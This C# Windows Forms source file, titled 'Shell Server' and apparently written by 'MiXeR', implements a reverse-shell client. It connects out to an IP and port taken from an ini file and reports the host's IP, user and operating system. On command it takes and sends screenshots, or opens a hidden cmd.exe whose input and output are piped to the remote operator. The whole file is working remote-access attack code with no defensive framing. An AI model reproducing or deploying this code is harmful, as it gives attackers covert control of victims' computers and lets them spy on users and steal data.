//
//  Shell Server - by MiXeR


using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;


namespace ReverseAPP
{

   
    public partial class FrmDummy : Form
    {
        TcpClient _tcpClient;
        NetworkStream _networkStream;
        StreamWriter _streamWriter;
        StreamReader _streamReader;
        Process _processCmd;
        StringBuilder _strInput;
        Funciones Utilidades = new Funciones();
        string _mutexApp, _ipConexion,_puertoConexion;
        private bool _shell;
        public bool Conectado = false;
        private Thread _serverThread;

        public FrmDummy()
        {
            bool createdNew;

            _mutexApp = Utilidades.RandomString(10);  // Mutex de la aplicacion        
            Mutex m = new Mutex( true, _mutexApp, out createdNew );       
               
            if( !createdNew )
            {
                // Instance already running; exit.
                MessageBox.Show(@"Exiting: Instance already running" );
                Environment.Exit(0);
            }
            m.Close();
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
           
        }

     
        private void RunServer()
        {
            while (Conectado)
            {
                try
                {
                    _tcpClient = new TcpClient();
                    _strInput = new StringBuilder();
                    _tcpClient.Connect(_ipConexion, Convert.ToInt32(_puertoConexion));
                    _networkStream = _tcpClient.GetStream();
                    _streamReader = new StreamReader(_networkStream);
                    _streamWriter = new StreamWriter(_networkStream);
                    SetStatus("Conectado");
                    EnviaDatos("M1X3R|" + Utilidades.ObtenerIp() + "|" + Utilidades.ObtenPcUser() + "|" + Utilidades.TipoSistemaOperativo() + "|" + _mutexApp);
                }
                catch (Exception err)  // No hay cliente, regresa
                { 
                    Console.WriteLine(err.Message);
                    Cleanup();
                    if (Conectado)
                    {
                        SetStatus("Reconectando...");
                        Thread.Sleep(1000);
                        continue;
                    }

                    break;
                }

                try // Parser de comandos
                {
                    while (Conectado)
                    {
                        var line = _streamReader.ReadLine();
                        if (line == null)
                        {
                            break;
                        }

                        _strInput.Append(line);
                        _strInput.Append("\r\n");

                        if (EncuentraComando("<:terminar:>"))
                        {
                            Detener(); // Cierra servidor
                        }
                        if (EncuentraComando("<:reiniciar:>"))
                        {
                            Cleanup(); // Cleanup para reiniciar Server
                            break;
                        }
                        if (EncuentraComando("exit"))
                        {
                            _shell = false;   // DOS Exit
                        }
                        if (EncuentraComando("<:hola:>"))
                        {
                            Utilidades.Hola();  // MessageBox de ejemplo
                        }
                        if (EncuentraComando("<:prueba:>"))
                        {
                            EnviaDatos("PRUEBA DE ENVIO DE DATOS" + "|" + Funciones.HashServer + "|"); // Prueba
                        }
                        if (EncuentraComando("<:captura:>")) // Captura de screenshot
                        {
                            EnviaDatos("<:imagen:>" + Utilidades.CapturarPantalla() + "<:imagen:>" + Funciones.HashServer + "<:imagen:>");
                        }
                        if (EncuentraComando("<:asignahash:>"))
                        {
                            Utilidades.AgregaHash(_strInput.ToString().Split(' ')[1].Trim()); // Comando asignarhash
                        }
                        if (EncuentraComando("<:shell:>")) // Shell para DOS
                        {
                            _shell = true;
                            _processCmd = new Process();
                            _processCmd.StartInfo.FileName = "cmd.exe";
                            _processCmd.StartInfo.CreateNoWindow = true;
                            _processCmd.StartInfo.UseShellExecute = false;
                            _processCmd.StartInfo.RedirectStandardOutput = true;
                            _processCmd.StartInfo.RedirectStandardInput = true;
                            _processCmd.StartInfo.RedirectStandardError = true;
                            _processCmd.OutputDataReceived += CmdOutputDataHandler;
                            _processCmd.Start();
                            _processCmd.BeginOutputReadLine();
                        }

                        if (_shell)
                        {
                            _processCmd.StandardInput.WriteLine(_strInput);
                        }

                        _strInput.Remove(0, _strInput.Length);
                    }
                }
                catch (Exception err)
                {
                    Console.WriteLine(err.Message);
                }
                finally
                {
                    Cleanup();
                }

                if (Conectado)
                {
                    SetStatus("Reconectando...");
                    Thread.Sleep(1000);
                }
            }            

            SetStatus("Desconectado");
        }

        bool EncuentraComando( string comando)
        {
            return _strInput.ToString().ToLower().LastIndexOf(comando, StringComparison.Ordinal) >= 0;
        }

        private void SetStatus(string text)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => toolStripStatusLabel1.Text = text));
                return;
            }

            toolStripStatusLabel1.Text = text;
        }

        private void Cleanup()
        {
            try
            {
                _shell = false;

                if (_processCmd != null && !_processCmd.HasExited)
                {
                    _processCmd.Kill();
                }
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }

            try
            {
                _streamReader?.Close();
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }

            try
            {
                _streamWriter?.Close();
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }

            try
            {
                _networkStream?.Close();
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }

            try
            {
                _tcpClient?.Close();
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }

            _processCmd = null;
            _streamReader = null;
            _streamWriter = null;
            _networkStream = null;
            _tcpClient = null;
        }

        private void Detener() // Comando para salir del servidor (cerrar aplicación)
        {
            Cleanup();
            Environment.Exit(Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data + "|" + Funciones.HashServer + "|");
                    _streamWriter.WriteLine(strOutput);
                    _streamWriter.Flush();
                }
                catch (Exception err)
                {
                    Console.WriteLine(err.Message);
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (Conectado)
            {
                return;
            }

            Conectado = true;
            button1.Enabled = false;
            button2.Enabled = true;
            SetStatus("Conectando...");
            _serverThread = new Thread(RunServer)
            {
                IsBackground = true
            };
            _serverThread.Start();
        }

        private void FrmDummy_FormClosing(object sender, FormClosingEventArgs e)
        {
         
        }

        private void FrmDummy_FormClosed(object sender, FormClosedEventArgs e)
        {
            Detener();
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Conectado = false;
            Cleanup();
            SetStatus("Detenido");
            button1.Enabled = true;
            button2.Enabled = false;
        }

        private void EnviaDatos(string cadena)
        {
            _streamWriter.WriteLine(cadena);
            _streamWriter.Flush();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Cargar opciones de Ini
            var myIni = new IniFile("opciones.ini");
            _ipConexion= myIni.Read("DefaultIP","opciones");
            _puertoConexion = myIni.Read("DefaultPort", "opciones");
            button2.Enabled = false;
            //MessageBox.Show(defaultVolume);
        }
    }
}
